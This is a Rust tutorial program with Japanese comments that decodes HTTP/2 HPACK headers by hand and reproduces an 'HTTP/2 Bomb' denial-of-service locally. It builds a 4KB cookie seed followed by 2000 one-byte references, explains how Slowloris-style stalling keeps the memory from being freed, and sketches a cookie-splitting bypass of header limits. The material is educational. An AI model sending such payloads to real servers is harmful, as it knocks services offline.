// net-extra (番外編): HTTP/2 のヘッダー圧縮 (HPACK) を手で読む / HTTP/2 Bomb を再現する
//
// net-02 では HTTP/1.1 を「改行区切りのテキスト」として手書きパースした。
// HTTP/2 はそこが根本的に違う:
//   - ヘッダーは "テキスト" ではなく "バイナリ" (HPACK, RFC 7541) で送られる
//   - 一度送ったヘッダーは "テーブル" に登録され、以降は数値インデックスで参照される
//
// このプログラムはクレートを一切使わず、素のバイト列を自分で組み立て / 復元して、
// 「ヘッダーがバイナリでどう読まれているか」を1バイト単位で可視化する。
// 最後に、その仕組みがそのまま脆弱性になる HTTP/2 Bomb (CVE-2026-49975) を再現する。

// =============================================================================
// 静的テーブル (RFC 7541 Appendix A)
// =============================================================================
//
// HTTP/2 のクライアントとサーバーは、この61個の「よく使うヘッダー」表を
// 最初から共有している。index 2 を指定すれば ":method: GET" の意味になる。
// → 送るのはたった1バイト。ここが HTTP/1.1 との最大の違い。
const STATIC_TABLE: [(&str, &str); 61] = [
    (":authority", ""),                   // 1
    (":method", "GET"),                   // 2
    (":method", "POST"),                  // 3
    (":path", "/"),                       // 4
    (":path", "/index.html"),             // 5
    (":scheme", "http"),                  // 6
    (":scheme", "https"),                 // 7
    (":status", "200"),                   // 8
    (":status", "204"),                   // 9
    (":status", "206"),                   // 10
    (":status", "304"),                   // 11
    (":status", "400"),                   // 12
    (":status", "404"),                   // 13
    (":status", "500"),                   // 14
    ("accept-charset", ""),               // 15
    ("accept-encoding", "gzip, deflate"), // 16
    ("accept-language", ""),              // 17
    ("accept-ranges", ""),                // 18
    ("accept", ""),                       // 19
    ("access-control-allow-origin", ""),  // 20
    ("age", ""),                          // 21
    ("allow", ""),                        // 22
    ("authorization", ""),                // 23
    ("cache-control", ""),                // 24
    ("content-disposition", ""),          // 25
    ("content-encoding", ""),             // 26
    ("content-language", ""),             // 27
    ("content-length", ""),               // 28
    ("content-location", ""),             // 29
    ("content-range", ""),                // 30
    ("content-type", ""),                 // 31
    ("cookie", ""),                       // 32
    ("date", ""),                         // 33
    ("etag", ""),                         // 34
    ("expect", ""),                       // 35
    ("expires", ""),                      // 36
    ("from", ""),                         // 37
    ("host", ""),                         // 38
    ("if-match", ""),                     // 39
    ("if-modified-since", ""),            // 40
    ("if-none-match", ""),                // 41
    ("if-range", ""),                     // 42
    ("if-unmodified-since", ""),          // 43
    ("last-modified", ""),                // 44
    ("link", ""),                         // 45
    ("location", ""),                     // 46
    ("max-forwards", ""),                 // 47
    ("proxy-authenticate", ""),           // 48
    ("proxy-authorization", ""),          // 49
    ("range", ""),                        // 50
    ("referer", ""),                      // 51
    ("refresh", ""),                      // 52
    ("retry-after", ""),                  // 53
    ("server", ""),                       // 54
    ("set-cookie", ""),                   // 55
    ("strict-transport-security", ""),    // 56
    ("transfer-encoding", ""),            // 57
    ("user-agent", ""),                   // 58
    ("vary", ""),                         // 59
    ("via", ""),                          // 60
    ("www-authenticate", ""),             // 61
];

// =============================================================================
// HPACK 整数エンコード (RFC 7541 §5.1)
// =============================================================================
//
// HPACK の数値は「先頭バイトの下位 N ビット」に詰める。
// 入りきらなければ、続くバイトに7ビットずつ詰めて、最上位ビット(0x80)を
// "まだ続く" フラグとして使う (可変長整数)。
//
//   prefix_bits : 先頭バイトのうち数値に使えるビット数 (Indexedなら7, Literalなら6)
//   flags       : 先頭バイトの上位ビットに乗せる種別フラグ (例: Indexed = 0x80)
fn encode_integer(value: usize, prefix_bits: u8, flags: u8) -> Vec<u8> {
    let max_prefix = (1usize << prefix_bits) - 1; // 2^N - 1 (例: 7ビットなら127)
    let mut out = Vec::new();

    if value < max_prefix {
        // プレフィックスに収まる → 1バイトで完結
        out.push(flags | value as u8);
    } else {
        // 収まらない → プレフィックスを全部1で埋め、残りを後続バイトに分割
        out.push(flags | max_prefix as u8);
        let mut remainder = value - max_prefix;
        while remainder >= 128 {
            out.push((remainder % 128) as u8 | 0x80); // 0x80 = "まだ続く"
            remainder /= 128;
        }
        out.push(remainder as u8); // 最後のバイトは 0x80 を立てない
    }
    out
}

/// 整数デコード。(復元した値, 消費したバイト数) を返す。
fn decode_integer(buf: &[u8], prefix_bits: u8) -> (usize, usize) {
    let max_prefix = (1usize << prefix_bits) - 1;
    let mut value = (buf[0] as usize) & max_prefix;
    if value < max_prefix {
        return (value, 1); // 1バイトで完結していた
    }
    // 後続バイトを7ビットずつ足していく
    let mut consumed = 1;
    let mut shift = 0;
    loop {
        let b = buf[consumed];
        value += ((b & 0x7f) as usize) << shift;
        consumed += 1;
        if b & 0x80 == 0 {
            break; // "続く" フラグが立っていない = 終端
        }
        shift += 7;
    }
    (value, consumed)
}

// =============================================================================
// HPACK の3つの表現形式 (このデモで使う分だけ)
// =============================================================================

/// Indexed Header Field (§6.1)
/// テーブルの index 番のヘッダーをまるごと参照する。先頭ビットは 1。
///   1xxxxxxx  ← 下位7ビットが index
/// index が 127 未満なら「たった1バイト」でヘッダー1個を表現できる。
fn encode_indexed(index: usize) -> Vec<u8> {
    encode_integer(index, 7, 0x80)
}

/// Literal Header Field with Incremental Indexing — 新しい名前 (§6.2.1)
/// テーブルにまだ無いヘッダーを送りつつ、動的テーブルにも登録する。
///   01000000             ← 種別(01) + 名前index=0 (=名前も文字列で続く)
///   <名前の長さ><名前>
///   <値の長さ><値>
/// この1回だけは名前と値の実バイトを送るが、以降は index 参照で使い回せる。
fn encode_literal_new_name(name: &str, value: &str) -> Vec<u8> {
    let mut out = Vec::new();
    out.push(0x40); // 01000000
    out.extend(encode_integer(name.len(), 7, 0x00)); // 名前: 長さ(H=0) + 実バイト
    out.extend_from_slice(name.as_bytes());
    out.extend(encode_integer(value.len(), 7, 0x00)); // 値: 長さ(H=0) + 実バイト
    out.extend_from_slice(value.as_bytes());
    out
}

// =============================================================================
// デコーダ — 受信側 (サーバー) がやっていること
// =============================================================================

/// index からヘッダー (名前, 値) を引く。
/// 1..=61 は静的テーブル、62 以降は動的テーブル (新しいものほど小さい番号)。
fn table_lookup(index: usize, dynamic: &[(String, String)]) -> (String, String) {
    if (1..=STATIC_TABLE.len()).contains(&index) {
        let (n, v) = STATIC_TABLE[index - 1];
        (n.to_string(), v.to_string())
    } else {
        let pos = index - STATIC_TABLE.len() - 1; // 62 → dynamic[0]
        dynamic[pos].clone()
    }
}

/// HPACK バイト列を復元する。
/// 戻り値: (復元したヘッダー列, 復元後の総バイト数)
/// この「総バイト数」が、サーバーが実際にメモリ上に組み立てる量。
/// 送られてきた wire のバイト数と比べると、増幅率が見える。
fn decode(wire: &[u8], dynamic: &mut Vec<(String, String)>) -> (Vec<(String, String)>, usize) {
    let mut headers = Vec::new();
    let mut reconstructed = 0usize;
    let mut i = 0;

    while i < wire.len() {
        let b = wire[i];
        if b & 0x80 != 0 {
            // --- Indexed Header Field (§6.1) ---
            let (index, consumed) = decode_integer(&wire[i..], 7);
            i += consumed;
            let (name, value) = table_lookup(index, dynamic);
            reconstructed += name.len() + value.len();
            headers.push((name, value));
        } else if b & 0x40 != 0 {
            // --- Literal with Incremental Indexing (§6.2.1) ---
            let (name_index, consumed) = decode_integer(&wire[i..], 6);
            i += consumed;
            let name = if name_index == 0 {
                let (len, c) = decode_integer(&wire[i..], 7);
                i += c;
                let s = String::from_utf8_lossy(&wire[i..i + len]).into_owned();
                i += len;
                s
            } else {
                table_lookup(name_index, dynamic).0
            };
            let (vlen, c) = decode_integer(&wire[i..], 7);
            i += c;
            let value = String::from_utf8_lossy(&wire[i..i + vlen]).into_owned();
            i += vlen;

            reconstructed += name.len() + value.len();
            // 動的テーブルの先頭に追加 (新しいものが index 62)
            dynamic.insert(0, (name.clone(), value.clone()));
            headers.push((name, value));
        } else {
            // 他の表現 (このデモでは使わない) — 打ち切り
            break;
        }
    }
    (headers, reconstructed)
}

// =============================================================================
// バイト列の可視化ヘルパー
// =============================================================================

/// バイト列を「16進・2進・ASCII」で1バイトずつ並べて表示する。
fn dump_bytes(label: &str, bytes: &[u8]) {
    println!("{label}  ({} バイト)", bytes.len());
    for &b in bytes {
        let ascii = if b.is_ascii_graphic() || b == b' ' {
            b as char
        } else {
            '.'
        };
        println!("    {b:#04x}   {b:08b}   '{ascii}'");
    }
}

fn section(title: &str) {
    println!("\n========================================================");
    println!("{title}");
    println!("========================================================");
}

// =============================================================================
// デモ本体
// =============================================================================

fn main() {
    // -------------------------------------------------------------------------
    // パート1: 静的テーブル参照 — 「1バイト = ヘッダー1個」
    // -------------------------------------------------------------------------
    section("パート1: 静的テーブル参照 (1バイトでヘッダー1個)");
    println!("HTTP/1.1 なら \":method: GET\" は11バイトのテキスト。");
    println!("HTTP/2 では静的テーブルの index 2 を指すだけ → 1バイト。\n");

    let method_get = encode_indexed(2); // :method: GET
    let path_root = encode_indexed(4); //  :path: /
    dump_bytes(":method: GET  =  encode_indexed(2)", &method_get);
    println!("    └ 0x82 = 1000_0010 : 先頭ビット1=Indexed, 残り 000_0010 = 2\n");
    dump_bytes(":path: /      =  encode_indexed(4)", &path_root);
    println!("    └ 0x84 = 1000_0100 : 先頭ビット1=Indexed, 残り 000_0100 = 4");

    // -------------------------------------------------------------------------
    // パート2: 整数エンコード — index が大きいと何バイトになるか
    // -------------------------------------------------------------------------
    section("パート2: HPACK 可変長整数 (7ビットプレフィックス)");
    println!("Indexed の index は先頭バイトの下位7ビットに詰める。");
    println!("127 未満は1バイト、それ以上は後続バイトに7ビットずつ分割する。\n");

    for v in [5usize, 62, 127, 1337] {
        let enc = encode_indexed(v);
        let bytes: Vec<String> = enc.iter().map(|b| format!("{b:#04x}")).collect();
        let (back, _) = decode_integer(&enc, 7);
        println!(
            "    index {v:>5}  →  [{}]  ({} バイト)  → デコード結果 {back}",
            bytes.join(", "),
            enc.len()
        );
    }
    println!("\n→ index 62 までは1バイト。HTTP/2 Bomb はこの「1バイト参照」を悪用する。");

    // -------------------------------------------------------------------------
    // パート3: 動的テーブル増幅 = HTTP/2 Bomb (CVE-2026-49975) の核心
    // -------------------------------------------------------------------------
    section("パート3: 動的テーブル増幅 (HTTP/2 Bomb)");

    // ① まず大きなヘッダーを1個だけ送り、動的テーブルに "種をまく"。
    //    ここだけは実バイトを送るのでコストがかかる (1回きり)。
    let big_value = "a".repeat(4096); // 4KB の cookie 値
    let seed = encode_literal_new_name("cookie", &big_value);
    println!(
        "① 種まき: cookie(4KB) を1回だけ送信 → ワイヤ {} バイト。動的テーブル index 62 に登録。\n",
        seed.len()
    );

    // ② 続いて、その index 62 への "1バイト参照" を大量に送る。
    //    送るのは N バイトなのに、サーバーは N×4KB を組み立てさせられる。
    let n_refs = 2000;
    let mut attack = seed.clone();
    for _ in 0..n_refs {
        attack.extend(encode_indexed(62)); // 0xBE = 1バイト
    }

    // ③ サーバー側 (デコーダ) を実際に回して、組み立てられる量を測る。
    let mut dynamic: Vec<(String, String)> = Vec::new();
    let (headers, reconstructed) = decode(&attack, &mut dynamic);

    let wire = attack.len();
    let ratio = reconstructed as f64 / wire as f64;
    println!("② 攻撃リクエスト: index 62 への1バイト参照 × {n_refs} 個を追加");
    println!("③ サーバーがデコードした結果:");
    println!("      復元したヘッダー数 : {}", headers.len());
    println!("      送信バイト (wire)  : {wire:>12} バイト");
    println!("      復元バイト (memory): {reconstructed:>12} バイト");
    println!("      増幅率             : 約 {ratio:.0} 倍");
    println!(
        "\n   1参照(1バイト) → サーバーは name+value = {} バイトを復元させられる。",
        "cookie".len() + big_value.len()
    );

    // ④ 現実の攻撃への外挿。
    section("パート4: これがなぜ32GB枯渇につながるか");
    let per_ref = "cookie".len() + big_value.len();
    let refs_for_32gb = 32usize * 1024 * 1024 * 1024 / per_ref;
    println!(
        "・1参照あたり {per_ref} バイトを復元 → 32GB に到達する参照数は約 {refs_for_32gb} 個。"
    );
    println!("・参照1個はワイヤ上たった1バイト。100Mbps なら一瞬で送り切れる量。");
    println!("・通常はリクエスト処理が終わればメモリは解放される。が、攻撃者は");
    println!("  フロー制御ウィンドウを0にし、1バイトの WINDOW_UPDATE を送り続けて");
    println!("  ストリームを完了させない (Slowloris)。→ 確保したメモリが解放されない。");
    println!("・結果: 増幅(HPACK) × 保持(Slowloris) = 数十GBのメモリ枯渇 → サーバー停止。");

    // 演習: 下記のコメントを外して挙動を観察してみよう。
    // exercise_hint();
}

// =============================================================================
// 演習用の雛形 (未呼び出し。コメントを外すと動く)
// =============================================================================
#[allow(dead_code)]
fn exercise_hint() {
    // 演習1(基礎): big_value のサイズや n_refs を変えて、増幅率がどう動くか観察する。
    //   - 値を 64KB にすると増幅率は? 参照数を半分にすると復元バイトは?
    //
    // 演習2(応用): 防御策「ヘッダー個数の上限」をデコーダに実装してみる。
    //   - decode() に max_headers 引数を足し、headers.len() が超えたら Err にする。
    //   - ヒント: 戻り値を Result<(Vec<_>, usize), String> に変える。
    //
    // 演習3(チャレンジ): Cookie 分割バイパスを再現する。
    //   - 1個の cookie を複数フィールドに分けて送ると、「個数」上限をすり抜けられる。
    //   - encode_literal_new_name("cookie", ...) を複数回呼んで、個数制限が
    //     なぜ無力になるかをデコーダ側で確認する。
}
